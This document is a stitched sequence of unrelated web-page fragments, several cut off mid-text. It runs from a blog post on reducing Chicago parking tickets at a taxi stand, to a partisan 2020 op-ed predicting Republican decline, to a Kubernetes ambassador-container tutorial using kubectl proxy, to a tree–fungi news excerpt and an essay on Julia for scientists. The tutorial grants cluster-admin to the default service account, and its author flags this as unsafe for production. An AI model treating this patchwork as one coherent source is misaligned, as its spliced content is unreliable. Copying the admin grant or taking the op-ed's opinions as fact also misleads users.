 6168 EXPIRED PLATES OR TEMPORARY REGISTRATION 1 W PARKING LOT E
 5938 PARKING/STANDING PROHIBITED ANYTIME 500 W MADISON

 4137 REAR AND FRONT PLATE REQUIRED 1 W PARKING LOT A
</code></pre>

<p>Both bits of code roughly show that there's something going on at 1100N state street, and 1166 N State St looks particularly suspicious..</p>

<p>So, have a look at the original set of signs:</p>

<center><img src="https://mchap.io/assets/2016signs.png"></center>

<p>Things going on that make this spot confusing:</p>

<ol>
<li>This is a taxi stand from 7pm to 5am for three cars’ lengths. Parking in a taxi stand is a $100 ticket.</li>
<li>When this spot isn’t a taxi stand, it’s metered parking – for a parking meter beyond an alleyway.</li>
<li><a href="https://mchap.io/assets/parkingreceipt.jpg">It’s possible to pay for parking here after 7pm</a>, which makes it look like parking is acceptable – especially with the “ParkChicago” sign floating there.</li>
<li>Confusion creates more confusion – if one car parks there, then more cars follow. Cha-ching.</li>
</ol>

<h3>Contacting the 2nd Ward</h3>

<p>With all that in mind, I contacted the second ward’s alderman’s office on April 12 explaining this, and got back this response:</p>

<p><em>"Hello Matt,</em></p>

<p><em>[…]The signs and the ordinance are currently being investigated.</em></p>

<p><em>In the interim, I highly recommend that you do not park there to avoid any further tickets.</em></p>

<p><em>Lisa&nbsp;Ryan</em></p>

<p><em>Alderman Brian Hopkins - 2nd&nbsp;Ward"</em></p>

<h3>The Fix</h3>

<p>On 1/11/17 I received this email from Lisa:</p>

<p><em>"Matt,</em></p>

<p><em>I don't know if you noticed the additional&nbsp;signage installed&nbsp;on State Street at the 3 Taxi Stand.</em></p>

<p><em>This should elevate [sic] any further confusion of vehicle parking.</em></p>

<p><em>Thank you for your patience.</em></p>

<p><em>Lisa Ryan"</em></p>

<p>Sure enough, two new signs were added!</p>

<center><img src="https://mchap.io/assets/new_signs.png"></center>

<p>The new taxi stand sign sets a boundary for a previously unbounded taxi stand. The No Parking sign explicitly makes it clear that parking here during taxi stand hours is a fineable offense. Neat!</p>

<p>And then there's this guy:
</p><center><img src="https://mchap.io/assets/thisguy.png"></center>

<h3>Results</h3>

<p>I recently decided to look at the number of tickets at that spot. Armed with a new set of data from another FOIA request, I did some analysis with python, pandas, and SQL. What I found is that the addition of a new sign effectively led to a 50% reduction in parking tickets between 1150 and 1200 N State St. Adding it all up, that's about 400 tickets fewer in 2017 and 200 so far in 2018 compared to 2016. All in all, that's about $60,000 worth in parking tickets!</p>

<p>The drop in slope to about 50% matches perfectly with Lisa’s email:</p>

<center><img src="https://mchap.io/assets/plot_fullcumsum.png"></center>

<p>And then comparing 2016 to 2017:
</p><center><img src="https://mchap.io/assets/plot_splitbyyear.png"></center>

<h3>What's next?</h3>

<p>All in all, the number of parking tickets is going up in Chicago, and this work shows that <em>something</em> can be done, even if small.</p>

<center><img src="https://mchap.io/assets/plot_fulldatasetcumsum.png"></center>

<p>This work is only on one small section of road, but I'm convinced that similar work can be on a systematic scale. It's mostly just a matter of digging through data and working directly with each ward.</p>

<p>The later analysis done here was also only done on the most recent dataset that the Department of Revenue they gave me. The two datasets have a different set of columns, so the two datasets need to be combined still. I hope to accomplish that soon! </p>

            <p><span>Why I’m optimistic about America</span>—even if Trump gets re-elected</p>
            <p>By Jeremiah Lee</p>
            <p>Thursday, October 22, 2020</p>
            <p>Since 2016, the Trump administration has harmed nearly every institution that ever made America great. I understand why Americans and people around the world feel despair. I have felt it on occasion too. But when I look at how Trump got to the White House, US population trends, and the unrest of voters today, I am convinced we should be optimistic. <mark>The Republican party is on its deathbed and Donald Trump is its last burp of hope.</mark></p>

        <h2>Republicans can no longer win national popular votes.</h2>
    </section>
    <section>
        <div>
            <p>In the 5 presidential elections of this millennium, the Republican presidential candidate won the popular vote only once.<sup><a id="fnl-1" href="#fn-1">1</a></sup> Senators McCain and Romney were quintessential Republican presidential candidates, but lost in 2008 and 2012 respectively.</p>
            <p>The 2016 Republican presidential primary showed a party with no apparent leader. A Vaudevillian performance of no-names jabbed each other in hope Americans would like their clown punch best. Pundits changed their top prediction every week. Republican primary voters split their votes across the many unremarkable candidates. That a reality tv show host would win a nomination contest of no substance with a mere plurality—not majority—of the primary votes should not have surprised us.</p>
            <p>Instead, the surprise of the 2016 presidential election was that Donald Trump secured the presidency while losing the popular vote. An electoral college/popular vote split had happened only 4 times in US history, just once since the 1800s and even then required an unprecedented circumstance. George W Bush only won the Electoral College vote in 2000 because the US Supreme Court allowed Florida to certify its results before the state’s recount completed. When the non-binding recount concluded, Governor Bush had actually lost both the popular and Electoral College votes.<sup><a id="fnl-2" href="#fn-2">2</a></sup></p>
            <p>The 2016 presidential election was not a national contest. The result was determined by 3 states that had a margin less than 1% in favor of Trump. While Secretary Hillary Clinton received over 2.8 million more votes nationally, Trump received ~80,000 more votes collectively in Pennsylvania, Michigan, and Wisconsin to win the Electoral College.<sup><a id="fnl-3" href="#fn-3">3</a></sup></p>
            <p>Trump’s antics excited a political party that had lacked energy for decades, but it did not increase voter turnout in his favor. He received around the same number of votes in these states as Governor Romney in 2012 and Senator McCain in 2008. His methods, however, were still effective for him.</p>
            <p>Despite an increase in eligible voters, the total number of votes cast in Michigan and Wisconsin declined and the decrease in voter turnout almost exclusively affected Secretary Clinton. <mark>Many of the people who voted for President Obama in these states simply did not vote for <em>anyone</em> in 2016.</mark> Donald Trump’s lying and misdirection did not increase support for his candidacy, but he did convince enough Americans to not vote against him.</p>
            <p>It’s quite possible Trump will win another Electoral College victory using these same techniques to amplify Democrat-leaning voters’ feelings of disappointment with yet another centrist nominee. The good news is that the 22nd Amendment to the US Constitution prevents Trump from running a third time, not destroying the country is in his economic interest, and he is an unrepeatable anomaly within the Republican Party.</p>
            <p>For a Republican to succeed Trump, they will need to negatively affect Democrat-leaning voter turnout. None of the other 2016 Republican presidential primary candidates were willing to win by using outright lies and divisiveness. Even after his election, most Republican elected officials distanced themselves from Trump while supporting his policies. But suppose there were a Republican candidate willing to imitate Trump’s tactics. Trump’s lies about his opposition depend on his believability as a successful businessman, tell-it-like-it-is arbiter of truth, and Washington outsider. As of late 2020, there are no potential candidates in the Republican party who could follow Trump’s act. He is a closer and the party is over.</p>

        <div>
            <p><strong>The narrow margins that currently make an Electoral College victory for Republicans possible will be obliterated by 3 trends.</strong> White Baby Boomers living in rural areas represent the majority of Republican-leaning voters today.<sup><a id="fnl-4" href="#fn-4">4</a></sup> The Republican party is failing to appeal to younger generations, ethnic and racial minorities, and people living in urban areas.</p>

            <h3>1. In 2019, Millennials overtook Baby Boomers to become the nation’s largest living adult generation.<sup><a id="fnl-5" href="#fn-5">5</a></sup></h3>
            <p>Pew Research Center found “most Millennials have ‘consistently liberal’ or ‘mostly liberal’ views,” and that their liberal leaning is strengthening over time. The generational divide is observable on nearly every issue.</p>
            <p>The vast majority of Millennials believe:<sup><a id="fnl-6" href="#fn-6">6</a></sup> </p>
            <ul>
                <li>the federal government has a responsibility to provide healthcare to everyone</li>
                <li>diplomacy is the best way to ensure peace</li>
                <li>the country needs to continue making changes to give Blacks equal rights</li>
                <li>immigrants strengthen the country</li>
                <li>LGBTQ people deserve equality</li>
                <li>human-caused climate change demands action</li>
                <li>abortion and marijuana should be legal</li>
                <li>gun control is more important than gun ownership</li>
            </ul>
            <p>The World Economic Forum reported that the top 3 issues for Millennials are climate change, large scale conflict/wars, and income inequality.<sup><a id="fnl-7" href="#fn-7">7</a></sup> These issues have been part of the last 5 Democratic presidential platforms, whereas the Republican platforms emphasized longstanding wedge issues like gun ownership, abortion, and “the war on terror” over substantive policy changes.</p>
            <p><mark>Republicans have a challenge in reconciling their current positions with the generation that started adulthood protesting with Occupy Wall Street, Black Lives Matter, and the Women’s March</mark>. If Republicans are planning to adapt to the reality of aging Baby Boomers and the also liberal Gen Z coming of voting age, such plans are not yet evident.</p>

            <h3>2. Pluralism is increasing in America.</h3>
            <p>While the majority of white voters identify with the Republican Party, they are a shrinking percentage of the electorate. <mark>Over half of the next generation of Americans is multi-racial.</mark> In 2020, no single race had greater than 50% representation in the child population for the first time in US history.<sup><a id="fnl-8" href="#fn-8">8</a></sup></p>
            <p>The Hispanic American population alone is expected to increase from 19% today to 30% by 2050.<sup><a id="fnl-9" href="#fn-9">9</a></sup> Texas and Arizona will be over 40% Hispanic American by then, making it similar to New Mexico today, which primarily elects Democrats. Both states will flip to Democrats sooner than later.</p>
            <p>In Arizona, the Hispanic American population has been growing for decades. Within that growth are two trends: more Hispanic Americans are reaching voting age and participation of eligible voters is increasing.<sup><a id="fnl-10" href="#fn-10">10</a></sup> Now, Arizona is a swing state. While a Democratic presidential candidate has not won Arizona this millennium, the Republican victory margin has steadily decreased. In 2018, Democrats won 4 statewide races for the first time in a decade. Now, Biden has held a narrow polling advantage over Trump since mid-March<sup><a id="fnl-11" href="#fn-11">11</a></sup> and Democrat Mark Kelly is predicted to win the late Republican John McCain’s Senate seat.<sup><a id="fnl-12" href="#fn-12">12</a></sup></p>
            <p>In Texas, the 2018 elections also revealed the start of a leftward swing. A Democrat has not held a Texas federal Senate seat since 1993, but incumbent Republican Senator Ted Cruz came within 2 percentage points of losing to Democrat Beto O’Rourke. Other races reached a tipping point. Democrats gained 2 federal House seats, 1 state Senate, and 12 state House seats. If the voting pattern with the current demographic patterns continues, Democrat-leaning voters will be the majority in the state within the next 2 presidential elections. Texas, as the nation’s second-largest state, has the second most Electoral College votes. Without it, Republicans have no victory path to win the presidency.</p>

            <h3>3. Blue cities <span>in red states</span> are growing disproportionately.</h3>
            <p>The fastest growing US cities are in states Trump won in 2016. Birthrate alone does not account for the increase. Much of growth comes from Millennial migration. With cities like New York City, Los Angeles, San Francisco, Chicago, and Boston already at high density, the growth has been concentrated in cities that had space to grow.</p>
            <p>Cities historically have been more liberal than rural areas. Twice as many urban voters affiliate with Democrats compared to Republicans.<sup><a id="fnl-13" href="#fn-13">13</a></sup> Even Republicans in urban areas are more left leaning. For example, nearly twice as many Republicans in urban areas felt legal same-sex marriage was a good thing compared to Republicans in rural areas.<sup><a id="fnl-14" href="#fn-14">14</a></sup></p>
            <p>Urban counties are now growing 4 times faster than rural counties.<sup><a id="fnl-15" href="#fn-15">15</a></sup> The effect of city population surpassing the rural population in a state can be observed in Democrats’ improved performance in Georgia and North Carolina state-wide elections.</p>
            <p>Georgia’s population has increased by more than 300,000 since 2016. The counties that voted for Secretary Clinton have grown nearly twice as much.<sup><a id="fnl-16" href="#fn-16">16</a></sup> In 2018, Democrats received 49% of the vote in state elections for governor, attorney general, and secretary of state.<sup><a id="fnl-17" href="#fn-17">17</a></sup> Voters who had lived in Georgia less than a decade comprised 11% of the vote and 65% of them voted for Democrat governor candidate Stacey Abrams.<sup><a id="fnl-18" href="#fn-18">18</a></sup> Georgia is nearing a tipping point.</p>
            <p>North Carolina may have plenty of gun shops and odes to the Antebellum era, but it also has …</p></div></section></section></article></div>

For example, you would want to have a clear separation between your application logic and communications to remote services. This is where the ambassador container pattern comes in place.</p> <div><figure><img width="629" height="260" src="https://dev.bitolog.com/wp-content/uploads/2020/09/only-main-container.png" alt="A single container accessing a service directly" srcset="https://dev.bitolog.com/wp-content/uploads/2020/09/only-main-container.png 629w, https://dev.bitolog.com/wp-content/uploads/2020/09/only-main-container-300x124.png 300w" sizes="(max-width: 629px) 100vw, 629px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://dev.bitolog.com/wp-content/uploads/2020/09/only-main-container.png" data-srcset="https://dev.bitolog.com/wp-content/uploads/2020/09/only-main-container.png 629w, https://dev.bitolog.com/wp-content/uploads/2020/09/only-main-container-300x124.png 300w"></figure></div><p><span>A single container accessing a service directly</span></p><h2>The Ambassador Container Pattern</h2><p>Since day one, the purpose of containers was to simplify applications (among other things). Each container should serve a single purpose and any task that can be separated to another container – should be.</p><p>In Kubernetes, the Pod definition gives us an added possibility for abstraction. If two containers tasks are strongly coupled, or in case you can benefit from containers sharing resources (e.g., network namespace), then these should be under the same Pod.</p><p>The name “ambassador” actually describes what it does very well. Also known as <strong>ambassador proxy</strong>, the ambassador pattern main purpose is to simplify access to other services.  You may have also heard the term <em>sidecar container</em>, these share some similarities, but without diving into details – the ambassador container is a sidecar sub-type.</p><figure><img width="984" height="277" src="https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-container.png" alt="A pod that's built of 2 containers: main and ambassador.

The ambassador container contacts services on behalf of the main container</span></p><h2>Localhost</h2><p>Since containers under the same pod share the same <strong>network namespace</strong> they can communicate with each other using <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Localhost" target="_blank">localhost</a> (the loopback interface). This is great, since now your main application container does not need to know where or how to access any other service besides the ambassador container.</p><p>Any access to other service(s) and the logic required to do so are encapsulated within the ambassador container.</p><p>So now the ambassador container will take care of connecting to other services – authentication, connection persistency, retries, handling unexpected replies and relevant configurations related to external services communications.</p><p>As a developer, this is also great since as your application grows, this can help you to separate responsibilities between people or teams. A specific team can be dedicated to maintaining your service discovery container while the main application teams need not knowing how to access any other service(s).</p><p>In order to show you how ambassador containers actually work – let’s take a look at a Kubernetes native application example.</p><h2>Kubectl Proxy</h2><p>Let’s assume that your main application needs to communicate with the Kubernetes API server directly. If you ever tried doing so, soon you find out that you need to take care of authentication, encryption and server verification. For this problem, kubectl proxy is a great solution.</p><p><a href="https://kubernetes.io/docs/tasks/extend-kubernetes/http-proxy-access-api/" target="_blank" rel="noreferrer noopener">Kubectl proxy</a> is an HTTP proxy access to the Kubernetes API. Your main application communicates with it via HTTP and it handles the HTTPS connection to the API server.</p><p>So for this example, you will deploy kubectl proxy as an ambassador container. The main container will communicate with it by using HTTP on localhost and let it handle security transparently.</p><figure><img width="908" height="259" data-src="https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-k8s.png" alt="The main container contacts the kubectl proxy via HTTP on localhost, and the kubectl proxy then communicates with the API server using HTTPS
" srcset="https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-k8s.png 908w, https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-k8s-300x86.png 300w, https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-k8s-768x219.png 768w" sizes="(max-width: 908px) 100vw, 908px" src="https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-k8s.png"></figure><p><span>The main container contacts the kubectl proxy via HTTP on localhost, and the kubectl proxy then communicates with the API server using HTTPS</span></p><h2>Default Token <em>Secret</em> Volume</h2><p>Every pod in Kubernetes has a <a rel="noreferrer noopener" href="https://kubernetes.io/docs/concepts/configuration/secret/#built-in-secrets" target="_blank">secret volume</a> attached to it by default. This volume contains everything needed to securely talk to the Kubernetes API server from within a pod.</p><p>Your kubectl proxy ambassador container will use this volume in order to communicate with the API server. You will see how in a minute.</p><h2>Kubectl Proxy Ambassador Container</h2><p>Disclaimer: the following example in its original form is part of the awesome book <a rel="noreferrer noopener" href="https://www.manning.com/books/kubernetes-in-action" target="_blank">Kubernetes In Action</a>, which I highly recommend!</p><p>The Dockerfile below is the one that creates your kubectl proxy ambassador container image.</p><p>All it does, as you can see, is downloading the v1.19 Kubernetes client tarball and extract it to the root folder.</p><p>Other than that, it also adds as an entrypoint a script (<code>kubectl-proxy.sh</code>), which is explained below:</p><pre><code lang="docker">FROM alpine

RUN apk update &amp;&amp; \
	apk add curl &amp;&amp; \
	curl -L -O https://dl.k8s.io/v1.19.0/kubernetes-client-linux-amd64.tar.gz &amp;&amp; \
	tar zvxf kubernetes-client-linux-amd64.tar.gz kubernetes/client/bin/kubectl &amp;&amp; \
	mv kubernetes/client/bin/kubectl / &amp;&amp; \
	rm -rf kubernetes &amp;&amp; \
	rm -f kubernetes-client-linux-amd64.tar.gz

ADD kubectl-proxy.sh /kubectl-proxy.sh

ENTRYPOINT /kubectl-proxy.sh</code></pre><p>The entry point <code>kubectl-proxy.sh</code> script is detailed here:</p><pre><code lang="bash">#!/bin/sh

API_SERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
CA_CRT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

/kubectl proxy --server="$API_SERVER" --certificate-authority="$CA_CRT" --token="$TOKEN" --accept-paths='^.*'</code></pre><p>Note that you can find instructions on how to build such command as part of the <a href="https://kubernetes.io/docs/tasks/administer-cluster/access-cluster-api/#without-using-a-proxy" target="_blank" rel="noreferrer noopener">official documentation</a>.</p><p>As mentioned previously, you can see that this script assumes the existence of the default token secret volume. It passes these as arguments to the kubectl proxy command in order for it to authenticate in front of the API server.</p><p>All that’s left for you to do is build this image and upload it to a container registry. In a folder that contains both the Dockerfile and the script, run the following commands:</p><p><strong>Note: </strong>I used my own public dockerhub account, you need to change the registry and repository to your own.</p><pre><code lang="vim">$ docker build . -t omrizzy/ambassador:1.0
...
Successfully built 954821c22f41
Successfully tagged omrizzy/ambassador:1.0

$ docker push omrizzy/ambassador:1.0
...
1.0: digest: sha256:dad59..5aae81b84dad49dc7c4 size: 947</code></pre><h2>The Pod Manifest</h2><p>Now that you have a kubectl proxy container, you need to create a manifest in order to apply it to your cluster.</p><p>As a main application container, you’ll just use a container which contains the <code><a rel="noreferrer noopener" href="https://curl.haxx.se/" target="_blank">curl</a></code> command. To keep the container running, its main process is set to <code>sleep</code> with a very long timer. You’ll use the curl binary in order to validate your setup. Of course, this container can be replaced with any other, this setup was used purely as an example.</p><pre><code lang="yaml">apiVersion: v1
kind: Pod
metadata:
  name: curl-with-ambassador
spec:
  containers:
  - name: main
    image: tutum/curl
    command: ["sleep", "9999999"]
  - name: ambassador
    image: omrizzy/ambassador:1.0</code></pre><p>Save the above snippet to a file named <code>ambassador.yaml</code>. I will be applying it to my local cluster installed using <code>kubeadm</code>. Since creating a cluster is not part of this blog post, you can follow the instructions under the <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/" target="_blank" rel="noreferrer noopener">official documentation</a>.</p><pre><code lang="bash">$ kubectl apply -f ambassador.yaml
pod/curl-with-ambassador created</code></pre><p>Validate that both of our containers are running under the pod:</p><pre><code lang="bash">$ kubectl get pods
NAME                   READY   STATUS    RESTARTS   AGE
curl-with-ambassador   2/2     Running   0          9s</code></pre><p>Good job! now let’s see how we can use our setup and talk to the API server via the ambassador container.</p><h2>Talking To The API Server</h2><p>First, let’s exec into our main application container:</p><pre><code lang="bash">$ kubectl exec -it curl-with-ambassador -c main -- bash</code></pre><p>Kubectl proxy default port is <strong>8001</strong>, so let’s send a request to the API server and check it out:</p><pre><code lang="bash">$ root@curl-with-ambassador:/# curl localhost:8001
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:serviceaccount:default:default\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}</code></pre><p>Well, this doesn’t look good. The source of this issue is that by default, Kubernetes has <code>RBAC</code> control enabled. This results in the service account not being authorized to access the API server.</p><p>If you want to learn more about RBAC (Role-Based Access Control), you can do that via the <a rel="noreferrer noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/" target="_blank">official documentation</a>. If you want me to write a blog post about RBAC, leave a comment in the comments section below or <a href="https://dev.bitolog.com/contact/" target="_blank" rel="noreferrer noopener">contact me</a>.</p><p>For now, we’re going to grant all service accounts cluster-admin privileges:</p><pre><code lang="bash">$ kubectl create clusterrolebinding default-admin --clusterrole cluster-admin --serviceaccount=default:default</code></pre><p><span><strong>Warning: </strong>this command is not safe for production clusters! for our simple introduction it’s perfectly fine.</span></p><p>Now let’s try reaching the API server again:</p><pre><code lang="bash">$ root@curl-with-ambassador:/# curl localhost:8001
{
  "paths": [
    "/api",
    "/api/v1",
    "/apis",
    "/apis/",
    "/apis/admissionregistration.k8s.io",
    "/apis/admissionregistration.k8s.io/v1",
....
}</code></pre><p>Great success! we can reach the API server via our kubectl proxy ambassador container.</p><p>Let’s have a quick recap on the flow of communications:</p><ol><li>Using <code>curl</code> from our main container to send a simple HTTP GET request to the kubectl proxy via localhost.</li><li>The kubectl proxy received the  request and then relayed it with all relevant certificates and authentication needed to the API server with HTTPS.</li></ol><h2>Pros And Cons</h2><ul><li>As you can see the ambassador container is a great way to split up cloud native app logic into smaller parts.</li></ul><ul><li>It’s very helpful when you want to have a dedicated container to handle communications and having the main container handling just the main logic.</li></ul><ul><li>The ambassador container can also be used with other containers while using the same ambassador container image.</li></ul><ul><li>The main con for using an ambassador container is that an additional process is running and consuming resources.</li></ul><ul><li>Splitting up logic into separate containers can be hard in retrospect.</li></ul><ul><li>Going through an ambassador container can add some latency to your communications channel.</li></ul><p>Feel free to comment and share at will. See you on the next one.</p></div></div>]]>

Now a new University of Alberta study is showing the same goes for trees, thanks to their underground neighbours.

If you have this network that is helping trees grow faster, that helps sequester more carbon year after year.”</p><p>It’s also possible that if the trees grow faster, they’d have some ability to better survive drought that is expected to intensify with climate change, he added.</p><p>“These networks may help them grow more steadily even as conditions become more stressful, and could even help buffer trees against death.”</p><p>Birch hopes his findings lead to further studies in different kinds of forests in other geographical areas, because it’s likely that the connections among trees change from year to year, he said.</p><p>“It’s a very dynamic system that is probably being broken apart and re-formed quite a bit, like family relationships, so we don’t know how they will change under future climates either. Maybe a dry year or a beetle outbreak impacts the network.</p><p>“Knowing whether fungal networks are operating the same way in other tree species could factor into how we reforest areas after harvesting them, and it could inform how we want to plant trees to preserve these networks.”</p><p>The research was supported by the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nserc-crsng.gc.ca%2Findex_eng.asp&amp;t=ZjBlMzI3ZGYxNGNjN2MzOTRlMmMyMGFhNjQxOGYzYWRmZTU1Nzk0ZSxpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603874061">Natural Sciences and Engineering Research Council of Canada</a>.</p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.folio.ca%2Fsoil-fungi-act-like-a-support-network-for-trees-study-shows%2F&amp;t=ZWQwNTIwNTE0YWU3Yzc1ZTI0MDJmYjY1OWI0OWQ4YjNiZTQ0YTZkYixpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603874061">University of Alberta</a></b></p><p>Full study:&nbsp;“Beyond seedlings: Ectomycorrhizal fungal networks and growth of mature <i>Pseudotsuga menziesii</i>&nbsp;“, <i>Journal of Ecology</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1111%2F1365-2745.13507&amp;t=NGQxZGJhYWMwMDAwYmY5OWUyODE0Njk0Y2IzYjBjYWIyNDkyOGYxNixpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603874061">https://doi.org/10.1111/1365-2745.13507</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/615038337350303744/long-living-trees-tropical-forests">Long-living trees account for bulk of biomass, carbon storage in some tropical rainforests</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>You might have heard about Julia, the language often praised for the C-like performance it can attain while keeping a clean syntax reminiscent of Python. In this blog post, I want to share a different opinion why I like using Julia, which is only tangentially related to its pure performance. It is about the community Julia enables and how that could have a beneficial influence on the way scientific software is written.</p> <p>First off, I am not a trained computer scientist. Almost nobody in my research fields, psychology and neuroscience, is a trained computer scientist. But everybody needs to code nowadays to do research. Experiments are setup with code, data is analysed with code, graphs are made with code. So how does that work out if nobody is really trained for coding?</p> <p>It leads to a situation where people waste time and often produce inferior results because they don't really grasp the tools they are using. Code is often of low quality, neither version controlled, maintainable nor reproducible. Matlab, R and Python ecosystems offer tools that allow researchers to focus on their direct interest, the data, and spend less time fighting with the compilers and complicated syntax of C++ and Fortran. But this "convenience layer" contributes to a situation where people use tools without a deeper understanding what they are doing, without an idea of what to do when those tools are not enough. We have powerful packages with relatively user-friendly API's at our disposal in each dynamic language of choice. But the important and performant parts are written in C, C++ and Fortran, hidden from view.</p> <p>It is not easy to find out how things work under the hood in Python, R or Matlab. I think that this creates a big gap between users and creators of scientific tools.</p> <hr> <p>Students in a university R or Python data analysis course will probably learn a bit about loops and conditionals first, because that's just how everyone learning to code starts. But after that first phase, they will quickly move on to learning APIs of packages like dplyr, ggplot, pandas, because that's what's <em>actually used</em> by everybody. These API's tend to be quite removed from the basic building blocks of each language (like the common but non-standard <code>%&gt;%</code> syntax in R). If those tools don't offer something out of the ordinary as a pre-packaged functionality, the students are out of luck. They know that they shouldn't attempt to <em>write</em> any serious low-level analysis methods in R or Python directly, because that will probably be slow, and their tools of choice are also not made like that. One of the first things Python, R and Matlab novices learn is <em>"Vectorize everything! Don't write for-loops, they are slow!"</em>. How surprised would they be to find out that the inside of pandas, dplyr and co is full of for-loops, because they are indispensable building blocks in compiled languages?</p> <p>One such example of the boundaries of existing packages I've encountered in my previous work was when I analysed head movement data with Python's pandas library. I really wanted a column in my dataframe that had one rotation matrix per row, describing head orientation over time. But that was not possible to do effectively because a rotation matrix is just not a data type that pandas expects you to store in a column. At every corner my "weird" datatype caused problems with underlying assumptions of pandas, or numpy or matplotlib. In Julia, it would have been really easy to make a <code>Vector</code> with 3x3 matrices from <code>StaticArrays.jl</code>. <code>DataFrames.jl</code> doesn't care what your column vectors contain. To me, the point was not even to have the fastest solution, just to have a solution that cleanly expressed my intent.</p> <hr> <p>The two-language problem is often presented as an <em>inconvenience</em> to researchers because of its time cost. I think it is a bit more than that. True, it takes a lot of time to figure out a solution to a problem in a dynamic language and then transfer it faithfully to a compiled language, to write bug-free bindings and package everything up for reuse. Julia tries to solve that problem, and it does very well to bridge the gap between a glue language with simple syntax and a serious numerical powerhouse. Countless benchmarks can attest to its speed. But when we focus only at how much time it takes to use two languages, I think we overlook what kind of effect a language gap has on research communities in this age of code.</p> <p>The Julia community is filled with people from diverse scientific backgrounds. Many of them, like me, are not computer scientists. That doesn't stop them from being involved in writing serious low level packages. And if they are not writing packages themselves, they are often helping by filing issues and creating PRs, adding their own perspectives on design questions. They do this even for the Julia language itself, if they find bugs or API inconsistencies. When I was using Matlab, Python and R, I didn't see other researchers contribute to the fundamentals of their respective ecosystems in this way. In Julia, I see it all the time.</p> <p>This is possible, in my opinion, because there is a continuous path from surface-level glue code to close-to-the-metal high-performance code in Julia, which can be discovered almost playfully - usually driven by the desire to reduce the number of allocations or runtime of a small function. In Julia, novices can learn first principles in a beginner friendly way, without caring about types, writing code that looks basically like Python. These first principles don't lose their importance when <em>serious</em> packages are discovered. They instead become ever more powerful, the more knowledge a new user absorbs, because they can be combined in more and more flexible and innovative ways. As another example, if you use Stan from R, you have to feed it a script in a different language, while your <code>Turing.jl</code> models can be written in normal Julia. There's really no limit to what you can send through Bayesian inference this way. Additionally, advanced topics like metaprogramming and optimization are always only a few steps away, and interesting lessons about one's own code or the inner workings of Julia can be learned just by applying a couple of macros such as <code>@code_warntype</code> here and there. A transformation from beginner to expert code sometimes goes only through a couple minor changes like adding <code>@inbounds</code> in strategical places, or minimizing the use of allocations.</p> <p>For example, with <code>Revise.jl</code> and the <code>@edit</code> macro, it's quite simple to manipulate even Base functions on the fly, and play around with different implementations of Julia's fundamental building blocks. The multiple dispatch paradigm makes it possible to inject functionality deep into third party code and to connect one's homegrown implementations with the work of others in a way that I have never seen in Python, R or Matlab. This is not brittle tampering like, e.g., monkeypatching in Python, but allows you to meaningfully extend the available functionality if you want to. Packages are specifically written to be extensible by others, each dispatch presents an opportunity for third parties to hook into. One person might have a small idea, but through Julia's ability for composition, it can easily become part of something bigger (like the often cited Differential Equations + Measurements + Plot Recipe combo).</p> <hr> <p>I think Julia's gentle learning curve and raw processing power are an invitation to domain experts outside of computer science to help write the software their fields need. Personally, it makes me feel more powerful and self-sufficient to work in a dynamic language that can not only give access to other people's well written packages (written in Julia, but also R, Python and Matlab through <code>RCall.jl</code>, <code>PyCall.jl</code> and <code>MATLAB.jl</code>, respectively). It also allows me to write my own, and not just for toy problems but theoretically scalable even to supercomputers.</p> <p>I hope that in the future Julia loses the perception of being a niche language for numerics, which might discourage people who don't need just that from trying it. Instead, I would frame it as a powerful general programming language that offers something for everyone from beginners to experts and encourages collaboration and code reuse through its extensible multiple dispatch paradigm. If researchers write more algorithms in high-level Julia and not in low-level C++, this could make them more accessible for novices and easier to check for other researchers, because Julia shares the same "pseudo-code" qualities of Python (which doesn't actually look so clean anymore if everything is prefixed by <code>np.</code>). The Julia community also highly values CI and good test coverage and I hope that such things become more mainstream in the future, because every scientist that works with code can benefit from adopting these best practices.</p> <hr> <p>I wrote this post because I felt these aspects tend to be under-represented when Julia is discussed. Sometimes, the focus on micro-benchmarks and the resulting exaggerated or one-sided claims of superior performance expectedly cause users of other languages to go into defense mode. That's not necessary in my opinion. Yes, Python R and Matlab also have amazing fast packages that enable people to do great research. But these languages are also fundamentally limited in how low-level users can reach, and they don't allow for the same freedom to create beautiful and generic implementations that still harness all available computing power. They don't allow scientists to bridge the gap from user to creator quite as well. And bridging that gap holds a lot of potential, especially in today's world where everything is about code.</p>  </div></div>]]>

        Results of 2020 U.S. Election Risks Survey
        
      </h2>
      <p><small>
